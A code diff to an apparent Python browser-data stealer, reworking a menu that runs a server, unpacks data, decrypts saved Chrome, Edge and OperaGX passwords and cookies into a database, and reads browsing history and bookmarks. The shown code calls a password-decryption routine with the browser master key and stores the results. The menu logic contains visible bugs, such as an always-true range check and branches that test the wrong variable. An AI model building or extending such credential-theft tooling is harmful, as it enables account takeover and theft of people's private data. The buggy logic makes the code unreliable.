@@ -109,10 +109,8 @@ def ch_pass(nav):
     cursor1.execute('''CREATE TABLE passwords(url, username, password)''')
     try:
         for i in cursor.fetchall():
-            print(i)
             decrypted_password = ch_decrypt_pass(i[2], ch_master_Key(nav))
             if decrypted_password:
-                print(decrypted_password)
                 cursor1.execute("INSERT INTO passwords (url, username, password) VALUES (?, ?, ?)", (i[0], i[1], decrypted_password))
                 cnn1.commit()
     except:
@@ -120,6 +118,7 @@ def ch_pass(nav):
     finally:
         cursor.close()
         cnn.close()
+
 """
 ***************************
 *Funciones Chrome y OperaGX
@@ -136,22 +135,80 @@ def main():
     while True:
         print("1. Run Server")
         print("2. Unpack Data")
-        print("3. Decrypt Chrome Passwrds and Generate a DB")
-        print("4. Decrypt Edge Passwrds and Generate a DB")
-        print("5. Decrypt OperaGX Passwrds and Generate a DB")
-        print("8. Cerrar")
+        print("3. Decrypt Passwrds and Generate a DB")
+        print("4. Check Historial")
+        print("5. Decrypt Cookies")
+        print("6. Check Bookmarks")
+        print("7. Cerrar")
 
 
         x = int(input())
-        if x != 8:
-            if x == 3:#Chrome
-                options[x]("chrome")
-            elif x == 5:#Opera
-                options[3]("Opera")
-            else:#Resto
+        if x>0 or x<7:
+            if x == 1 or x == 2:
                 options[x]()
+            if x == 3:
+                print("1. Decrypt Chrome Passwrds and Generate a DB")
+                print("2. Decrypt Edge Passwrds and Generate a DB")
+                print("3. Decrypt OperaGX Passwrds and Generate a DB")
+                y = int(input())
+                if y == 1:
+                    #Chrome
+                    options[3]("chrome")
+                elif x == 2:
+                    pass
+                    #Edge
+                    #options[x]("esge")
+                elif y == 3:
+                    #OperaGX
+                    options[3]("Opera")
+            if x == 4:
+                print("1. Check Chrome Historial")
+                print("2. Check Edge Historial")
+                print("3. Check OperaGX Historial")
+                y = int(input())
+                if y == 1:
+                    # Chrome
+                    options[x]("chrome")
+                elif x == 2:
+                    #Edge
+                    options[x]("Edge")
+                elif y == 3:
+                    #OperaGX
+                    options[x]("Opera")
+            if x == 5:
+                print("1. Decrypt Chrome Cookies")
+                print("2. Decrypt Edge Cookies")
+                print("3. Decrypt OperaGX Cookies")
+                y = int(input())
+                if y == 1:
+                    # Chrome
+                    options[x]("chrome")
+                elif x == 2:
+                    #Edge
+                    options[x]("Edge")
+                elif y == 3:
+                    #OperaGX
+                    options[x]("Opera")
+
+            if x == 6:
+                print("1. Check Chrome Bookmarks")
+                print("2. Check Edge Bookmarks")
+                print("3. Check OperaGX Bookmarks")
+                y = int(input())
+                if y == 1:
+                    # Chrome
+                    options[x]("chrome")
+                elif x == 2:
+                    #Edge
+                    options[x]("Edge")
+                elif y == 3:
+                    #OperaGX
+                    options[x]("Opera")
+
+            if x == 7:
+                break
         else:
-            break
+            pass
 
 
 
